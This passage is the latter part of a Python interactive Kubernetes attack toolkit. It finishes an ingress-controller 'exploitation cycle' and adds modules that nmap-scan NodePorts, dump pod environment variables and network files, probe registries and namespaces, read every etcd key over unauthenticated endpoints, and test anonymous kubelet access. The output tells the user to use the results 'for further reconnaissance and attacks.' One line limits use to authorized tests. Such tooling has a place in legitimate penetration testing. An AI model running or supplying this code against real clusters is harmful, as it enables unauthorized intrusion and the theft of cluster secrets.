        if cp.returncode != 0:
            print(f'  [!] Failed to send AdmissionReview request: {cp.stderr}')
        else:
            print('  Sent AdmissionReview request. Checking response...')
            print(f'  Response: {cp.stdout}')

        # Step 5: Check logs
        print('\nStep 5: Checking ingress controller logs...')
        log_cmd = f"kubectl logs {target['pod']} -n {target['namespace']}"
        cp = run(log_cmd, capture=True)
        if cp.returncode == 0:
            print('  Recent logs (check for "successfully validated configuration, accepting"):')
            print('\n'.join(cp.stdout.splitlines()[-10:]))  # Last 10 lines
        else:
            print(f'  [!] Failed to retrieve logs: {cp.stderr}')

        # Step 6: Clean up
        print('\nStep 6: Cleaning up...')
        run(f"kubectl delete -f {save_path}", capture=True)
        run(f"kubectl delete svc dummy-svc -n {ingress_ns}", capture=True)
        os.unlink(save_path)
        port_forward_proc.terminate()
        print('  Cleaned up resources.')

        print('\nAutomatic exploitation cycle completed. Check logs above for success indicators.')
        print('WARNING: Verify results manually. Use only in authorized test environments.')


def nodeport_scanner():
    """List NodePort services and suggest which IP:port to try from outside the cluster."""
    print('\n[5] NodePort scanner')
    services = kubectl_json('get svc --all-namespaces')
    if not services:
        print('  Could not list services.')
        return

    nodeports = []
    for s in services.get('items', []):
        spec = s.get('spec', {})
        if spec.get('type') == 'NodePort':
            ns = s['metadata']['namespace']
            name = s['metadata']['name']
            for p in spec.get('ports', []):
                nodeports.append((ns, name, p.get('nodePort'), p.get('port'), p.get('protocol')))

    if not nodeports:
        print('  No NodePort services found.')
        return

    print('  Found NodePort services:')
    for ns, name, nport, port, proto in nodeports:
        print(f'   - {ns}/{name} nodePort={nport} targetPort={port} proto={proto}')

    # Show nodes' IPs
    nodes = kubectl_json('get nodes')
    if nodes:
        for n in nodes.get('items', []):
            addrs = n.get('status', {}).get('addresses', [])
            ips = [a['address'] for a in addrs if a.get('type') in ('ExternalIP', 'InternalIP')]
            print(f"  Node {n['metadata']['name']} -> {ips}")
    print('\nTry <node-ip>:<nodePort> from your testing host if network permits.')

    # Optional nmap scan for ports 30000-32767 on nodes
    if input('Run nmap scan on ports 30000-32767 for nodes? [y/N]: ').lower().startswith('y'):
        if which("nmap") is None:
            print("[!] nmap not found. Install nmap to use this feature.")
            return
        if nodes:
            for n in nodes.get('items', []):
                addrs = n.get('status', {}).get('addresses', [])
                ips = [a['address'] for a in addrs if a.get('type') in ('ExternalIP', 'InternalIP')]
                if ips:
                    ip = ips[0]
                    print(f"\nScanning Node {n['metadata']['name']} IP {ip} ports 30000-32767...")
                    cp = run(f"nmap -sV -p 30000-32767 {ip}", capture=True)
                    print(cp.stdout if cp.returncode == 0 else f"[!] Failed: {cp.stderr}")
        else:
            print('  No nodes found for scanning.')


def env_info():
    """Gain environment information from a pod: env, /etc/hosts, etc."""
    print("\n[6] Gaining Environment Information from a pod")
    pods = kubectl_json("get pods --all-namespaces")
    if not pods:
        print("  [!] Could not list pods.")
        return

    pod_list = []
    for p in pods.get('items', []):
        ns = p['metadata']['namespace']
        name = p['metadata']['name']
        pod_list.append((ns, name))

    if not pod_list:
        print('  No pods found.')
        return

    print(f"  Found {len(pod_list)} pods:")
    for i, (ns, name) in enumerate(pod_list, 1):
        print(f"   {i}. {ns}/{name}")

    choice = input("\nChoose a pod index to inspect (or press Enter to cancel): ").strip()
    if not choice:
        print("Cancelled.")
        return
    try:
        idx = int(choice) - 1
        ns, name = pod_list[idx]
    except Exception:
        print("Invalid choice")
        return

    commands = [
        "env",
        "cat /etc/hosts",
        "cat /etc/resolv.conf",
        "ip route show",
        "ifconfig"
    ]

    for cmd in commands:
        print(f'\nExecuting: {cmd} in {ns}/{name}')
        cp = run(f"kubectl exec -n {ns} {name} -- {cmd}", capture=True)
        if cp.returncode == 0:
            print(cp.stdout)
        else:
            print(f'  [!] Failed: {cp.stderr}')

    print('\nUse this information for further reconnaissance and attacks.')


def registry_scanner():
    """Search for registries in the cluster and curl /v2/_catalog to check auth."""
    print("\n[7] Search for registries in the cluster")
    services = kubectl_json('get svc --all-namespaces')
    if not services:
        print('  Could not list services.')
        return

    registries = []
    for s in services.get('items', []):
        ns = s['metadata']['namespace']
        name = s['metadata']['name']
        ports = s.get('spec', {}).get('ports', [])
        for p in ports:
            if p.get('port') == 5000 or 'registry' in name.lower():
                cluster_ip = s.get('spec', {}).get('clusterIP')
                domain = f"{name}.{ns}.svc.cluster.local"
                registries.append((ns, name, cluster_ip, domain, p.get('port')))

    if not registries:
        print('  No potential registries found (port 5000 or name containing "registry").')
        return

    print(f'  Found {len(registries)} potential registries:')
    for ns, name, ip, domain, port in registries:
        print(f'   - {ns}/{name} IP={ip} domain={domain} port={port}')
        print('    Checking /v2/_catalog...')
        cp = run(f"curl -s -m 5 http://{domain}:{port}/v2/_catalog", capture=True)
        if cp.returncode == 0:
            if 'login' in cp.stdout.lower() or '401' in cp.stdout or '403' in cp.stdout:
                print('      [!] Authentication required (401/403 or login prompt)')
            else:
                print('      No authentication (200 OK):')
                print(f'      {cp.stdout[:200]}...')  # Truncate long output
        else:
            print(f'      [!] Failed to access: {cp.stderr}')

    print('\nNote: If HTTPS, try https:// with -k for curl. This checks for auth on registries.')


def ns_bypass():
    """Kubernetes namespaces bypass check: list ns and try access pods in them."""
    print("\n[8] Kubernetes namespaces bypass check")
    ns_list = kubectl_json("get namespaces")
    if not ns_list:
        print("  [!] Could not list namespaces.")
        return

    ns_names = [n['metadata']['name'] for n in ns_list.get('items', [])]
    print(f"  Found namespaces: {len(ns_names)}")
    for name in ns_names:
        print(f"\nChecking access to pods in namespace {name}...")
        cp = run(f"kubectl get pods -n {name}", capture=True)
        if cp.returncode == 0:
            print('  Accessible! Pods:')
            print(cp.stdout)
        else:
            print('  Not accessible (RBAC restriction?):')
            print(cp.stderr)

    print('\nThis checks RBAC permissions for getting pods in each namespace.')
    print('Note: Even if not accessible via RBAC, network bypass may allow direct IP access to services/pods.')


def core_components_check():
    """Check core components: apiserver flags, etcd no-TLS, kubelet anon access."""
    print("\n[9] Core components check (apiserver, etcd, kubelet)")

    # 1. Check kube-apiserver flags (--anonymous-auth, --insecure-port)
    print("\nChecking kube-apiserver flags (--anonymous-auth, --insecure-port)...")
    apiserver_pods = kubectl_json("get pods -n kube-system -l component=kube-apiserver")
    if not apiserver_pods:
        print("  [!] Could not find kube-apiserver pods.")
    else:
        for p in apiserver_pods.get('items', []):
            name = p['metadata']['name']
            cp = run(f"kubectl exec -n kube-system {name} -- cat /proc/1/cmdline", capture=True)
            if cp.returncode == 0:
                cmdline = cp.stdout.strip().replace('\x00', ' ')
                anon_auth = '--anonymous-auth=true' in cmdline
                insecure_port = '--insecure-port=' in cmdline
                print(f"  Pod {name}:")
                if anon_auth:
                    print("    [!] --anonymous-auth=true (anonymous access enabled)")
                else:
                    print("    --anonymous-auth=false (ok)")
                if insecure_port:
                    print("    [!] --insecure-port enabled (insecure HTTP port)")
                else:
                    print("    --insecure-port not enabled (ok)")
            else:
                print(f"  [!] Failed to get cmdline for {name}: {cp.stderr}")

    # 2. Check etcd (access without TLS)
    print("\nChecking etcd access without TLS (port 2379)...")
    etcd_pods = kubectl_json("get pods -n kube-system -l component=etcd")
    if not etcd_pods:
        print("  [!] Could not find etcd pods.")
    else:
        for p in etcd_pods.get('items', []):
            name = p['metadata']['name']
            node_name = p['spec']['nodeName']
            # Get node IP
            node = kubectl_json(f"get node {node_name}")
            if node:
                addrs = node.get('status', {}).get('addresses', [])
                ips = [a['address'] for a in addrs if a.get('type') == 'InternalIP']
                if ips:
                    etcd_ip = ips[0]
                    print(f"  Trying curl on etcd at {etcd_ip}:2379/version...")
                    cp = run(f"curl -m 5 http://{etcd_ip}:2379/version", capture=True)
                    if cp.returncode == 0:
                        print(f"    [!] Accessible without TLS: {cp.stdout}")
                    else:
                        print("    Not accessible without TLS (ok or requires TLS/auth)")
                else:
                    print(f"  [!] No InternalIP for node {node_name}")
            else:
                print(f"  [!] Could not get node {node_name}")

    # Optional etcdctl check for etcd access
    if which("etcdctl") is not None:
        print("\nChecking etcd access with etcdctl (read all keys)...")
        etcd_endpoints = f"{etcd_ip}:2379"  # Use the first etcd IP
        cp = run(f"etcdctl --endpoints=http://{etcd_endpoints} get / --prefix --keys-only", capture=True)
        if cp.returncode == 0:
            print(f"    [!] Accessible without auth/TLS: {cp.stdout[:200]}...")
        else:
            print("    Not accessible (ok):")
            print(cp.stderr)
    else:
        print("\n[!] etcdctl not found. Skip etcdctl check.")

    # 3. Check kubelet (anonymous access via 10250 port)
    print("\nChecking kubelet anonymous access (port 10250)...")
    nodes = kubectl_json("get nodes")
    if not nodes:
        print("  [!] Could not get nodes.")
    else:
        for n in nodes.get('items', []):
            name = n['metadata']['name']
            addrs = n.get('status', {}).get('addresses', [])
            ips = [a['address'] for a in addrs if a.get('type') == 'InternalIP']
            if ips:
                kubelet_ip = ips[0]
                print(f"  Trying anonymous access to kubelet at {kubelet_ip}:10250/pods...")
                cp = run(f"curl -k -m 5 https://{kubelet_ip}:10250/pods", capture=True)
                if cp.returncode == 0 and 'Unauthorized' not in cp.stdout:
                    print(f"    [!] Anonymous access allowed: Returns pods info")
                else:
                    print("    Anonymous access denied (ok)")
            else:
                print(f"  [!] No InternalIP for node {name}")

    print('\nCore components check complete. Review for vulnerabilities.')


def spawn_shell():
    """Spawn a shell and return to menu after exit."""
    print("\n[10] Spawning shell. Type 'exit' to return to menu.")
    subprocess.run("/bin/bash", shell=True)
    print("\nReturned to menu.")


# ---------------------
# Command registry - add your functions here
# ---------------------
COMMANDS = [
    ("pod2node", "Generate privileged pod YAML and inspect nodes/pods", pod2node_interactive),
    ("privscan", "Scan for privileged containers (enumeration only)", privileged_containers_scan),
    ("rbac", "RBAC token scanner - check SA tokens for dangerous perms", rbac_token_checker),
    ("ingress", "Check ingress controller images/versions and craft safe Ingress with annotations", ingress_checker),
    ("nodeport", "List NodePort services and node IP hints", nodeport_scanner),
    ("envinfo", "Gain environment information from a pod (env, hosts, etc.)", env_info),
    ("registryscan", "Search for registries in the cluster and suggest curling them", registry_scanner),
    ("nsbypass", "Kubernetes namespaces bypass check (list ns and try access pods)", ns_bypass),
    ("corecheck", "Check core components (apiserver flags, etcd no-TLS, kubelet anon access)", core_components_check),
    ("shell", "Spawn a shell and return to menu", spawn_shell),
]


def print_menu():
    print('Available commands:')
    for i, (key, desc, _) in enumerate(COMMANDS, 1):
        print(f'  {i}. {key:<10} - {desc}')
    print('\n  q. quit')


def main():
    global BANNER_SHOWN
    check_prereqs()
    # Show banner only on first entry to main() in this session
    if not BANNER_SHOWN:
        print(BANNER)
        BANNER_SHOWN = True
    
    while True:
        print_menu()
        choice = input('\nSelect an option (number or command): ').strip()
        if not choice:
            continue
        if choice.lower() in ('q', 'quit', 'exit'):
            print('bye')
            break
        # allow number or name
        func = None
        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(COMMANDS):
                func = COMMANDS[idx][2]
        else:
            for key, _, f in COMMANDS:
                if choice == key:
                    func = f
                    break
        if func is None:
            print('Invalid choice. Pick a number or command name.')
            continue
        try:
            func()
        except KeyboardInterrupt:
            print('\nInterrupted, returning to menu.')
        except Exception as e:
            print(f'Error in command: {e}')


if __name__ == '__main__':
    main()
